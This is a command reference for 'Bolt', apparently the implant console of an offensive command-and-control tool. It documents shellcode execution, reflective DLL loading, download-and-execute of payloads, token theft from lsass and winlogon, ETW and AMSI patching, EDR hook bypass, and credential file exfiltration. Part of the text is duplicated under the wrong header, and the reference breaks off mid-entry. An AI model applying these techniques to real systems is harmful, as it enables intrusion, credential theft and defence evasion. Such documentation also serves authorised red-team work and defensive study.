# Bolt Console Command Line Reference

This is a _(non-exhaustive)_ list of all commands supported in the Bolt
CLI. The content in here is similar to using the `help` command.

For the output of `help data` see the [Data Specification Identifiers](Identifiers.md) page.

For the output of `help strval` see the [String-Var Dynamic Values](StringValues.md) page.

## ToC

- [asm](#asm)
- [back](#back)
- [cat](#cat)
- [cd](#cd)
- [chan](#chan)
- [check_debug](#check_debug)
- [check_dll](#check_dll)
- [cp](#cp)
- [creds](#creds)
- [dex](#dex)
- [dll](#dll)
- [download](#download)
- [elevate](#elevate)
- [evade](#evade)
- [exit](#exit)
- [funcmap](#funcmap)
- [getsystem](#getsystem)
- [help](#help)
- [hup](#hup)
- [info](#info)
- [jitter](#jitter)
- [job](#job)
- [jobs](#jobs)
- [kill](#kill)
- [killdate](#killdate)
- [last](#last)
- [loginas](#loginas)
- [ls](#ls)
- [main](#main)
- [make_token](#make_token)
- [man](#man)
- [migrate](#migrate)
- [mktoken](#mktoken)
- [mounts](#mounts)
- [mv](#mv)
- [name](#name)
- [nc](#nc)
- [parent](#parent)
- [parent_clear](#parent_clear)
- [parent_desktop](#parent_desktop)
- [parent_elevated](#parent_elevated)
- [parent_exclude](#parent_exclude)
- [parent_fallback](#parent_fallback)
- [parent_include](#parent_include)
- [parent_name](#parent_name)
- [parent_pid](#parent_pid)
- [patch_dll](#patch_dll)
- [poweroff](#poweroff)
- [procdump](#procdump)
- [procname](#procname)
- [profile](#profile)
- [proxy](#proxy)
- [ps](#ps)
- [pull](#pull)
- [pwd](#pwd)
- [pwsh](#pwsh)
- [reboot](#reboot)
- [refresh](#refresh)
- [regedit](#regedit)
- [rename](#rename)
- [rev2self](#rev2self)
- [rm](#rm)
- [run](#run)
- [runas](#runas)
- [screenshot](#screenshot)
- [script](#script)
- [set_hide](#set_hide)
- [shell](#shell)
- [shutdown](#shutdown)
- [show_window](#show_window)
- [sleep](#sleep)
- [spawn](#spawn)
- [steal](#steal)
- [touch](#touch)
- [troll](#troll)
- [untrust](#untrust)
- [upload](#upload)
- [whoami](#whoami)
- [wallpaper](#wallpaper)
- [window](#window)
- [workhours](#workhours)
- [write](#write)
- [wts](#wts)
- [zerotrace](#zerotrace)
- [zombie](#zombie)

## asm

```shell
asm [-x|--detach] [-e|--entry <function>] <data>
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | Safe                        |
| Admin | Maybe _(depends on target)_ |

Reads some specified data as raw assembly (shellcode). By default this
command will assume a local path if it exists. But using Data Specification
Identifiers, it is possible to directly specify machine code if needed.

If the `-x` or `--detach` argument is specified, the command will be ran
in "detached" mode and will return instantly and not be monitored. (This
also allows the process to live even when the client is closed).

The owning process of this thread can be controlled by the parent filter,
which can be updated with the filter commands. By default the owner will
be the current client process if not set.

Data passed to this command will be evaluated for Data Specification
Identifiers, but will default to a local file path.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

If the file path points to a compiled DLL, this will convert it to
shellcode on the server side before being sent to the client.

The "-e" or "--entry" argument can be used to specify the function started
after DLLMain (if the file is a DLL or DLL bytes).

### Examples:

```shell
asm /home/hackerman/gibson.bin
asm /tmp/malware.dll
asm b$\x90\x33
```

## back

```text
back
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Go back to the Bolts menu.

## cat

```shell
cat <remote_path>
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | Safe                        |
| Admin | Maybe _(depends on target)_ |

Display the contents of the file at the specified path.

Environment variables are processed on the client.

### Examples:

```shell
cat C:/file1.txt
cat C:/Windows/system.ini
```

## cd

```shell
cd <remote_path>
```

|       |                           |
| ----- | ------------------------- |
| OS    | Any                       |
| OPsec | Safe                      |
| Admin | Maybe _(depends on path)_ |

Instructs the client to change it's current working directory.

Environment variables are processed on the client.

### Examples:

```shell
cd C:/
cd C:/Windows
```

## chan

```shell
chan [boolean]
```

|       |     |
| ----- | --- |
| OS    | Any |
| OPsec | n/a |
| Admin | n/a |

Enable/Disable channel mode. If no option is specified, enable channel
mode (if not already enabled).

Can take multiple types of boolean values: (`true`, `T`, `t`, `yes`, `y`,
`enable`, `e`, `1`).

### Examples:

```shell
chan
chan true
chan disable
```

## check_debug

```shell
check_debug
```

|       |                 |
| ----- | --------------- |
| OS    | Any except WASM |
| OPsec | Safe            |
| Admin | No              |

Checks if the client process is being debugged. Returns true if a debugger
is present, false otherwise.

## check_dll

```shell
check_dll [-r|--raw] [-f|--function <function>] <remote_dll_name> [data]
```

|       |                                   |
| ----- | --------------------------------- |
| OS    | Windows                           |
| OPsec | Safe-ish _(depends on arguments)_ |
| Admin | No                                |

Inspect the memory region or function (if supplied) of the supplied DLL
name or path to determine if any hooks are present.

A DLL name, such as ntdll, kernel32 or shell32 for example may be
specified. If a path is specified, the full path may be omitted if the
DLL is a well known DLL, such as shell32. The `.dll` extension may also
be omitted regardless of full path or name. Functions may be specified
with the `-f` argument.

Function checks without any source (or the `--raw` argument) will just
perform a JMP instruction check in the first 4 bytes to determine if there
is any long JMPs in place.

Any source data in this function will be used to compare against. If no
function is specified with no source, this will load the file from the
local client file system. Any data passed to this function will be evaluated
for Data Specification Identifiers, but will default to a local file path.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

The `--raw` option may be used to indicate that the passed bytes, file or
string is raw Assembly and should not be parsed by the DLL loader. When
used without source, this indicates to the client to compare against the
parsed local file on the client. This is only valid when a function is
specified.

### Examples:

```shell
check_dll ntdll
check_dll ntdll.dll -f NtOpenProcess
check_dll C:/Windows/System32/shell32.dll
check_dll kernel32.dll -f CreateEventW b$\x40\x43
check_dll C:/Windows/System32/user32 -f MessageBoxW ~/local_user32.dll
```

## cp

```shell
cp <remote_source> <remote_dest>
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | **Not Safe! Disk Write**    |
| Admin | Maybe _(depends on target)_ |

Copies a file from the specified remote path to the remote destination.
The copy will overrite any file present at the destination path.

Environment variables are processed on the client.

### Examples:

```shell
cp C:/file1 C:/file2
```

## creds

```text
creds [-c|--clear] [-d|--domain <domain>] [[domain\]user[@domain]] [password]
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

View, set or clear the current saved credential set.

This shell can store credentials to be used for successive calls to `run`,
`hup`, `shell`, `pwsh` and `zombie`. If the credentials are valid, the
commands will execute as the credentialed user instead.

If no arguments are specified, this will return the current saved credentials
(if any). Otherwise this can be used to set the credentials or clear them
with the `-c` or `--clear` argument.

If a domain is not specified with `-d` or `--domain`, it will be parsed
from the username. Common domain prefixes/suffixes are recognized, such
as:

- user@domain
- domain/user
- domain\user

If a domain is found, the username will be cleaned (without the domain)
and set and the domain will be set as the new domain value.

Any non-set value (except domain) will not be changed. Use an empty value
for that value to set it to empty.

(The domain value is ignored on non-Windows clients).

### Examples:

```shell
creds
creds -c
creds user
creds user "" # empty password
creds user password
creds domain\user Password123
creds -d example.com bob password
```

## dex

```text
dex [-x|--detach] [-a|--agent <user-agent>] <url>
```

|       |                                                           |
| ----- | --------------------------------------------------------- |
| OS    | Windows _(ASM/DLL is Windows only)_                       |
| OPsec | **Not Safe! (If the target is a Binary/DLL), Disk Write** |
| Admin | No                                                        |

Downloads the file at the supplied URL (as the client) and attempt to
execute it. The `Content-Type` header determines what action is taken,
and can take the form of many different types, such as an EXE, PowerShell
or Assembly for example.

If the `-x` or `--detach` argument is specified, the command will be ran
in "detached" mode and will return instantly and not be monitored. (This
also allows the process to live even when the client is closed).

**DLL or Binary files make a write to disk!**

The parent of this executable can be controlled by the parent filter,
which can be updated with the filter commands. By default the parent will
be the current client process if not set.

This command is affected by the `set_hide` command, which by default
does not show any processes launched.

The `-a` or `--agent` argument may be specified to change the User-Agent
the client uses to connect to the server. String-Var Dynamic Values are
supported. If left empty, the default Firefox agent string will be used.

See [`help strvar`](StringValues.md) for more info on String-Var Dynamic Values.

### Examples:

```shell
dex google.com/robots.txt
dex -a 'GoogleBot v%100d' google.com/file.txt
```

## dll

```text
dll [-x|--detach] [-r|--reflect] [-e|--entry <function>] <data>
```

|       |                                                                        |
| ----- | ---------------------------------------------------------------------- |
| OS    | Windows                                                                |
| OPsec | **Not Safe! (If a local file is used without reflection), Disk Write** |
| Admin | Maybe _(depends on target)_                                            |

Loads a DLL into memory of a process.

If the `-x` or `--detach` argument is specified, the command will be ran
in "detached" mode and will return instantly and not be monitored. (This
also allows the process to live even when the client is closed).

The behavior of this command is affected by the Data Specification
Identifiers in the supplied data.

- If no Data Specification Identifier is found or the identifier indicates
  any identifier that is NOT external, the raw contents will be loaded
  into memory and sent to the client.
  If the `-r` or `--reflect` argument is used, the server will convert
  the DLL to shellcode and run it on the client as assembly, otherwise
  the file will be written to a temp folder on disk and loaded directly.

- If the data contains a Remote File Path Data Specification Identifier,
  path will be sent to the client to load the path directly from disk.
  _NOTE: The `-r` or `--reflect` argument is ignored in this scenario._

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

The `-e` or `--entry` argument can be used to specify the function started
after DLLMain. This will only occur if the DLL is reflected and will be
ignored if empty.

The owning process of this thread can be controlled by the shell filter,
which can be updated with the filter commands. By default the owner will
be the current client process if not set.

### Examples:

```shell
dll x$/tmp/implant.dll
dll -r /tmp/malware.dll
dll C:/Windows/malware.dll
```

## download

```text
download <remote_file> [local_path]
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | Safe                        |
| Admin | Maybe _(depends on target)_ |

Download a remote file. If the local path is non-empty and not omitted,
the downloaded contents will be saved to that local path. Otherwise the
contents of the file will be displayed on screen, similar to the `cat`
command.

Environment variables are processed on the client (for the remote_path).

### Examples:

```shell
download /root/.ssh/id_rsa ~/keys.pem
download C:/important-file.txt
download C:/Windows/system32/config/SYSTEM system.reg
```

## elevate

```text
elevate [pid | process_name]
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | Safe                        |
| Admin | Maybe _(depends on target)_ |

Attempt to steal and use a token from the target process.

If the pid and/or name is not supplied, the parent filter will be used,
which can be updated with the parent commands.

If no pid or name is supplied and the parent filter is empty, this will
return an error.

### Examples:

```shell
elevate
elevate 1337
elevate lsass.exe
elevate winlogon.exe
```

## evade

```text
evade <flag1,flag2,..flagN>
```

|       |                                |
| ----- | ------------------------------ |
| OS    | Windows _(*nix support soon!)_ |
| OPsec | Safe                           |
| Admin | No                             |

Performs one or more evasion procedures on the client. These procedures
can be space of comma seperated.

Currently the following (Windows Only) evasion procedures are supported:

| Flag                          | OS      | Description                                                                                                      |
| ----------------------------- | ------- | ---------------------------------------------------------------------------------------------------------------- |
| patch_etw, pe, zerotrace      | Windows | Patch `Etw*` functions with Assembly that will prevent any events from being executed.                           |
| patch_amsi, pa, zeroamsi      | Windows | Patch `Amsi*` functions so they return pass values and will not trigger alerts.                                  |
| hide_threads, ht, zerothreads | Windows | Hide each currently running client implant thread from any debugger  by using the `HideThreadFromDebugger` flag. |
| erase_header, eh              | Windows | Prevent debugging attempts by zero-ing out the PE header and it's structures.                                    |

The special flag name `all` can be used to run all procedures.

### Examples:

```shell
evade all
evade patch_amsi
```

## exit

```text
exit
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Go back to the Bolts menu.

## funcmap

```text
funcmap <ls|add|del|del_all> [function] [-r|--raw] [data]
```

|       |                                 |
| ----- | ------------------------------- |
| OS    | Windows                         |
| OPsec | Safe-ish _(depends on command)_ |
| Admin | No                              |

NOTE: This ability must be compiled in the client in order to work!
Otherwise this command will always return an error. Check the "Abilities"
section using `info` and look for "funcmap" to determine if this is avaliable.

Create a new memory segment and write the trampaline and syscall to the
memory and subsitute if for the supplied Nt* function name.

This function allows for bypassing ETW and/or EDR hooking and can be used
to call `Nt*` functions through our own memory block. Due to this, all
functions this command applies to are `Nt*` (syscall) functions in ntdll.dll.

This commands takes arguments similar to `patch_dll` and `check_dll`,
except for the function name is explicit and no local paths are allowed.

The `action` method is also required and takes the following values:

- **ls**:
  Reterive a listing of the current remapped functions and their memory
  addresses. The names of the functions returned are hashed using FNV32
  and are not their direct names.
- **add**:
  Add a function to be remapped. This requires the function name and
  a data source. If the client is not using this function, this will return
  and error of "File not Found". Any data passed to this command will be
  evaluated for Data Specification Identifiers, but will default to a
  local file path.
  See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.
  The `--raw` option may be used to indicate that the passed bytes, file
  or string is raw Assembly and should not be parsed by the DLL loader.
- **del, delete, remove**:
  Remove a remapped function. This only requires the function name.
- **del_all, delete_all, remove_all**:
  Remove **ALL** currently remapped functions. This does not require any
  additional arguments.

### Examples:

```shell
funcmap ls
funcmap remove_all
funcmap del NtQuerySystemInformation
funcmap add NtCreateThreadEx ~/ntdll.dll
funcmap add NtOpenProcess -r b$\\x43\\x90\\x0F\\x05
```

Executes a command on the client but detaches immediately and returns
without retrieving the exit code or stdout/stderr.

The parent of this command can be controlled by the parent filter, which
can be updated with the filter commands. By default the parent will be
the current client process if not set.

This command is affected by the `set_hide` command, which by default
does not show any processes launched.

The `$` and `.` prefixes are allowed for use with this command.

This command is affected by any saved credentials (if no credentials are
specified manually. See below.)

The additional `-u`, `-p` and `-d` arguments may be used to change the
user the process is executed as. See the `runas` command for more info.

### Examples:

```shell
hup echo lol
hup ping 127.0.0.1
hup -u bob -p Password1 whoami /all
```

## getsystem

```text
getsystem
```

|       |                             |
| ----- | --------------------------- |
| OS    | Windows                     |
| OPsec | Safe                        |
| Admin | Maybe _(depends on target)_ |

Attempt to steal and use a token from a built in list of standard processes.

This function is a wrapper for the `elevate` command that uses the following
processes for elevation:

- svchost.exe
- winlogon.exe
- wininit.exe

For more fine grain control of the target(s), use the `elevate` or `steal`
commands.

## help

```text
help <command>
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Get the helptext for the supplied command.

### Examples:

```shell
help hup
help zombie
help migrate
```

## hup

```text
hup [-u <user>] [-d <domain>] [-p <password>] <command>
```

|       |                              |
| ----- | ---------------------------- |
| OS    | Any                          |
| OPsec | Maybe _(depends on command)_ |
| Admin | Maybe _(depends on command)_ |

Executes a command on the client but detaches immediately and returns
without retrieving the exit code or stdout/stderr.

The parent of this command can be controlled by the parent filter, which
can be updated with the filter commands. By default the parent will be
the current client process if not set.

This command is affected by the `set_hide` command, which by default
does not show any processes launched.

The `$` and `.` prefixes are allowed for use with this command.

This command is affected by any saved credentials (if no credentials are
specified manually. See below.)

The additional `-u`, `-p` and `-d` arguments may be used to change the
user the process is executed as. See the `runas` command for more info.

### Examples:

```shell
hup echo lol
hup ping 127.0.0.1
hup -u bob -p Password1 whoami /all
```

## info

```text
info
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Display system and client information, such as PID, PPID, user and OS
version.

## jitter

```text
jitter [percentage %]
```

|       |     |
| ----- | --- |
| OS    | Any |
| OPsec | n/a |
| Admin | n/a |

Update the jitter percentage value for the client. The specified value
can include or omit the percentage sign `%`.

If no value is specified, this displays the current jitter percentage.

### Examples:

```shell
jitter
jitter 50
jitter 15
```

## job

```text
job <job_id>
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Retrieve the results of a completed Job.

### Examples:

```shell
job 1337
```

## jobs

```text
jobs
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Display Jobs in progress or cached completed Jobs.

## kill

```text
kill <pid | process_name>
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | Safe _(Process logging?)_   |
| Admin | Maybe _(depends on target)_ |

Attempts to force kill a process by it's Process ID (PID) or image name.

### Examples:

```shell
kill 1337
kill explorer.exe
```

## killdate

```text
killdate [date/time]
```

|       |     |
| ----- | --- |
| OS    | Any |
| OPsec | n/a |
| Admin | n/a |

Update the jitter kill date value for the client. The specified value
should take the form of `YYYY-MM-DD HH:MM`.

The values `YYYY` may be subbed for `YY` or the date can be shortened to
`MM-DD` which takes the next year if the date has already passed. `HH:MM`
can also be omitted which will set the kill date to midnight on the
specified date. The value of `HH:MM` may also be specified by itself to
indicate the time of the current day.

If no value is specified, this displays the current kill date.

### Examples:

```shell
killdate
killdate 23:30
killdate 2050-10-30
killdate 10-30 13:30
killdate 2050-10-30 18:45
```

## last

```text
last
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Display the last time the client connected.

## loginas

```text
loginas [-i|--interactive] [-d|--domain <domain>] <[domain\\]user[@domain]> [password]
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | Maybe _(Network/ETW logs?)_ |
| Admin | No                          |

Perform a network login with the supplied credentials. The command will
NOT use any stored credentials and will only use the credentials specified.

This allows for any commands/access outside of the local device to be
authenticated as the target user. The current process username will NOT
change as this only affects REMOTE resources.

If a domain is not specified with `-d` or `--domain`, it will be parsed
from the username. Common domain prefixes/suffixes are recognized, such
as:

- user@domain
- domain/user
- domain\user

If a domain is found, the username will be cleaned (without the domain)
and use and the domain will be used as the new domain value.

By default this command will do a network login. If the `-i`/`--interactive`
argument is supplied, an interactive login attempt will be made.

Alias of `make_token`.

### Examples:

```shell
loginas alice
loginas -i bob Password123
loginas corp\bob Password123
loginas -d example.com joe password1
```

## ls

```text
ls [remote_path]
```

|       |                           |
| ----- | ------------------------- |
| OS    | Any                       |
| OPsec | Safe                      |
| Admin | Maybe _(depends on path)_ |

Retrieves a list of files in the supplied directory path. If no path is
given, the client will use the current working directory.

Environment variables are processed on the client.

### Examples:

```shell
ls
ls C:/
```

## main

```text
main
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Go back to the main menu.

## make_token

```text
make_token [-i|--interactive] [-d|--domain <domain>] <[domain\\]user[@domain]> [password]
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | Maybe _(Network/ETW logs?)_ |
| Admin | No                          |

Perform a network login with the supplied credentials. The command will
NOT use any stored credentials and will only use the credentials specified.

This allows for any commands/access outside of the local device to be
authenticated as the target user. The current process username will NOT
change as this only affects REMOTE resources.

If a domain is not specified with `-d` or `--domain`, it will be parsed
from the username. Common domain prefixes/suffixes are recognized, such
as:

- user@domain
- domain/user
- domain\user

If a domain is found, the username will be cleaned (without the domain)
and use and the domain will be used as the new domain value.

By default this command will do a network login. If the `-i`/`--interactive`
argument is supplied, an interactive login attempt will be made.

### Examples:

```shell
make_token alice
make_token bob Password123
make_token corp\bob Password123
make_token -d example.com joe password1
```

## man

```text
man <command>
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Get the helptext for the supplied command.

Alias of `help`.

### Examples:

```shell
man hup
man zombie
man migrate
```

## migrate

```text
migrate [pipe] [file]
        [-m|--method]     <method>
        [-t|--target]     <process_name | pid>
        [-n|--profile     <profile>
        [-f|--args]       <args>
        [-a|--agent]      <user-agent>
        [-R|--no-reflect]
        [-u|--user]       <[domain\]user[@domain]>
        [-d|--domain]     <domain>
        [-p|--password]   <password>
        [-e|--entry]      <function>
        [-z|--no-auto]
```

|       |                                                                     |
| ----- | ------------------------------------------------------------------- |
| OS    | Any                                                                 |
| OPsec | **Not Safe! (If a local file without reflect is used), Disk Write** |
| Admin | Maybe _(depends on method/target)_                                  |

Migrate control to another process using a type of method. The method can
be specified by the `-m` argument.

The `pipe` argument is required and specifies what pipe name to use to
connect to the new instance. (However if the `-P/--pipe` argument was
specified at runtime or through the `DOPPLER_PIPE` environment variable
the pipe value will be inferred from there and it may be omitted. This
action can be disable using the `-z/--no-auto` argument.) The pipe value
is most likely compiled into the client.

If any DLL or ASM files are specified using the Doppler command line, the
file will be used if no file path is specified. Doppler will perfer the ASM
payload over DLL, if specified. If no method is specified, it will default
to ASM or DLL if a file is specified.

By default, the current profile will be used, but can be changed by
specifying the name with the `-n` argument.

If the method is `self`, `exec` or `exe` the additional `-u`, `-p` and
`-d` arguments may be used to change the user the process is executed as.
See the `runas` command for more info.

Data Specification Identifiers may be used in the data arguments to this
command.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

The following methods are valid:

- **dll**:
  Use the data specified as a DLL migration method. This method requires
  a target to be specified as the host for the DLL. By default, if the
  `-R` or `--no-reflect` arguments are NOT supplied, this will convert
  the DLL data to assembly before sending it to the client. Otherwise the
  DLL will be written to disk before loading.
  If a remote path identifier is used instead, the `-R` and `--no-reflect`
  arguments are ignored.
  The `-e` or `--entry` argument can be used to specify the function started
  after DLLMain. This will only occur if the DLL is reflected and will be
  ignored if empty.
- **asm**:
  Use the data specified as assembly migrate code. This method requires
  a target to be specified as the host for the shellcode. If the data
  represents a DLL, this will convert the DLL to assembly before sending
  it to the client.
  The `-e` or `--entry` argument can be used to specify the function started
  after DLLMain (if the file is a DLL or DLL bytes).
- **exec** or **exe**:
  Execute a command as the migrate method. This is the default option
  if a method is not specified. If the special value `self` is used, this
  will use the current client binary path to execute instead.
- **pexec** or **url**:
  Download a payload and execute it as a migrate method. This works
  similar to the `dex` command and follows the same content rules.
  This method will be automatically selected if a URL is detected and
  no method is specified. To force the usage of this method, use `pexec`
  or `url` as the `-m` argument value.
  Similar to the `dex` command, the `-a` or `--agent` argument may be
  used to change the User-Agent used from the default value. See the
  `dex` or `pull` command for more info.
  If a target is specified and the downloaded type requires a target, it
  will be used, otherwise a random process will be chosen.
  If the download type is a command type the parent can be controlled by
  the parent filter, which can be updated with the filter commands. By
  default the parent will be the current client process if not set.
- **zombie**:
  Use the data specified as assembly migrate code in a zombified process.
  This method requires a command to be used as the host, supplied using the
  `-f` argument. The running binary must exist but the arguments may be
  random/invalid. If the data represents a DLL, this will convert the DLL
  to assembly before sending it to the client.
  The parent of the zombie process can be controlled by the parent filter,
  which can be updated with the filter commands. By default the parent
  will be the current client process if not set.
  The `-e` or `--entry` argument can be used to specify the function started
  after DLLMain (if the file is a DLL or DLL bytes).

The arguments for this command are similar to the `spawn` command.

### Examples:

```shell
migrate pipe-me self
migrate -m exec pipe-me
migrate -p my_profile -m dll pipe-me ~/implant.dll
migrate pipe-me <http://path.to.shell.code>
migrate -m url pipe-me path.to.shell.code
migrate -p my_profile -m asm ~/bolt.bin
migrate -m zombie -f notepad.exe ~/implant.dll
migrate -m self -u admin -p Password123 derp-me
```

## mktoken

```text
mktoken [-i|--interactive] [-d|--domain <domain>] <[domain\\]user[@domain]> [password]
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | Maybe _(Network/ETW logs?)_ |
| Admin | No                          |

Perform a network login with the supplied credentials. The command will
NOT use any stored credentials and will only use the credentials specified.

This allows for any commands/access outside of the local device to be
authenticated as the target user. The current process username will NOT
change as this only affects REMOTE resources.

If a domain is not specified with `-d` or `--domain`, it will be parsed
from the username. Common domain prefixes/suffixes are recognized, such
as:

- user@domain
- domain/user
- domain\user

If a domain is found, the username will be cleaned (without the domain)
and use and the domain will be used as the new domain value.

By default this command will do a network login. If the `-i`/`--interactive`
argument is supplied, an interactive login attempt will be made.

Alias of `make_token`.

### Examples:

```shell
mktoken alice
mktoken bob Password123
mktoken corp\bob Password123
mktoken -d example.com joe password1
```

## mounts

```text
mounts
```

|       |                 |
| ----- | --------------- |
| OS    | Any except WASM |
| OPsec | Safe            |
| Admin | No              |

Lists all mounted drives and/or shares connected to the client.

## mv

```text
mv <remote_source> <remote_dest>
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | **Not Safe! Disk Write**    |
| Admin | Maybe _(depends on target)_ |

Moves a file from the specified remote path to the remote destination.
The move will overrite any file present at the destination path.

Environment variables are processed on the client.

### Examples:

```shell
mv C:/file2 C:/file3
```

## name

```text
name [new name]
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Changes the display name of this Bolt to the supplied name. This new name will
be displayed on the Bolts menu and can be used in place of the Bolt ID value.
This will update the name for all currently connected operator sessions.

Names have a minimum of 4 characters and a maximum of 64 characters.

If the "new name" argument is omitted or empty, the name will be revered to the
Bolt ID.

The function in this menu will NOT add this name as a Hardware mapping. To
map a name to a Hardware ID, use the "rename" function in the Bolts menu.

## nc

```text
nc [-T|--tcp]
   [-U|--udp]
   [-I|--icmp]
   [-S|--tls]
   [-X|--tls-insecure]
   [-r|--read]
   [-t|--timeout]     <seconds
   [-o|--output]      <local_file_path>
   <host:port>
   [data]
```

|       |                                         |
| ----- | --------------------------------------- |
| OS    | Any                                     |
| OPsec | Safe-ish _(depends on network logging)_ |
| Admin | No _(only needed for raw cons)_         |

Make a connection from the client device using tcp,udp,icmp,tls or
insecure (no CA check) tls. This function assumes tcp by default if
nothing is specified.

When making the connection a data payload may be specified to be sent.
This can include local files or raw data. By default, this will only SEND
the data and will **ONLY RECEIVE** if the `-r` or `--read` switch is used.

Data passed to this command will be evaluated for Data Specification
Identifiers, but will default to text.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

When reading it will read until socket closure, unless a timeout specified
with `-t` was specified (in seconds).

The results of the data will be returned back to the console output. The
flag `-o` allows for a local file for the output to be written to instead.

### Examples:

```shell
nc --tcp 1.1.1.1:53 b$Hello There!
nc -r 127.0.0.1:8080 b$GET /secret.txt HTTP/1.1\nHost: 127.0.0.1\n\n
```

## parent

```text
parent [..optional-args..] [pid | name1,name2,nameX...]
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

If no arguments are specified, this will just display the current Parent
Filter options set.

The last value may be a PID or a (comma|space) seperated list of process
names. If the value is a number an nothing else is specified, it will be
considered a PID, otherwise be evaluated as a name.

All set operations using this function are APPEND functions and will only
overrite. Use the `-c` or `--clear` flag to reset the Filter.

Other Optional Arguments

```text
  -c                         Clear the Parent Filter, takes priority over
  --clear                     all other arguments.
  -p        <pid>            Specify the PID to use for the Parent Filter.
  --pid     <pid>             Takes priority over all other options.
  -x        <name1,nameX>    Specify a (comma|space) seperated list of process
  --exclude <name1,nameX>     names to EXCLUDE from the Filter search process.
                             This may be used more than one time in the command.
  -d                          Enable the search to only ALLOW FOREGROUND or
  --desktop                   DESKTOP processes to be used. Default is don't
                              care. Takes priority over any disable arguments.
  -D                         Enable the search to only ALLOW BACKGROUND or
  --no-desktop                SERVICE processes to be used. Default is don't
                              care.
  -a | -e                    Enable the search to only ALLOW ELEVATED processes
  --admin | --elevated        to be used. Default is don't care. Takes priority
                              over any disable arguments.
  -A | -E                    Enable the search to only ALLOW NON-ELEVATED
  --no-admin | --no-elevated  processes to be used. Default is don't care.
  -f                         Enable the Filter to fallback if no suitable
  --fallback                  processes were found during the first run and
                              run again with less restrictive settings.
  -F                         Disable the Filter's ability to fallback if no
  --no-fallback               suitable processes were found during the first
                              run.
```

### Examples:

```shell
parent
parent 1337
parent -p 1337
parent svchost.exe
parent -d -F -D -e lsass.exe
parent -x notepad.exe,explorer.exe lsass.exe,svchost.exe
parent -A -d -x winword.exe,notepad.exe -x cmd.exe explorer.exe,chrome.exe
```

## parent_clear

```text
parent_clear
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Clears the global parent filter.

This command changes the behavior of all command based functions and will
set the filter behavior back to the default (native).

## parent_desktop

```text
parent_desktop [boolean]
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Set the global parent filter desktop/session target. A `true` value
represents a process that is running in a user session and most likely
has a desktop. `false` values target processes that do NOT have a desktop,
such as services or lsass.exe.

If no PID setting is used, these values will be used in combination with
the other filter settings to find a target process.

Omitting the argument will clear this filter option.

This command changes the behavior of all command based functions and will
attempt to target a process with the desktop/filter option chosen (if set).
If none are found, all commands ran will fail with an error.

### Examples:

```shell
parent_desktop
parent_desktop no
parent_desktop true
```

## parent_elevated

```text
parent_elevated [boolean]
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Set the global parent filter elevation target. A `true` value represents
a process that is running in a system or high integrity. `false` values
target processes that run with lower than high integrity (non-elevated).

If no PID setting is used, these values will be used in combination with
the other filter settings to find a target process.

Omitting the argument will clear this filter option.

This command changes the behavior of all command based functions and will
attempt to target a process with the elevation option chosen (if set).
If none are found, all commands ran will fail with an error.

### Examples:

```shell
parent_elevated
parent_elevated no
parent_elevated true
```

## parent_exclude

```text
parent_exclude [name1,name2,nameX...]
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Set the global parent filter excluded target names. These represent the
process names that CANNOT be selected when the filter does not have a PID
value.

If no PID setting is used, these values will be used in combination with
the other filter settings to find a target process.

The arguments can be a single entry or a list of comma seperated names.
Omitting the argument will clear the list.

This command changes the behavior of all command based functions and will
attempt to target a process with a name that does not match (case-insensitive)
any in the supplied list. If none are found, all commands ran will fail
with an error.

Inverse of `parent_include`.

### Examples:

```shell
parent_exclude
parent_exclude explorer.exe
parent_exclude winlogon.exe,lsass.exe
```

## parent_fallback

```text
parent_fallback [boolean]
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Set the global parent filter fallback setting. A `true` value indicates
that this parent filter can fallback to less restrictive settings if the
first run did not find any valid targets. `false` values disable the
ability for fallbacks to occur.

Omitting the argument will clear this filter option.

This command changes the behavior of all command based functions and
while less restrictive on targets, this provides better protection from
command failures if a target is not found.

### Examples:

```shell
parent_fallback
parent_fallback no
parent_fallback true
```

## parent_include

```text
parent_include [name1,name2,nameX...]
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Set the global parent filter included target names. These represent the
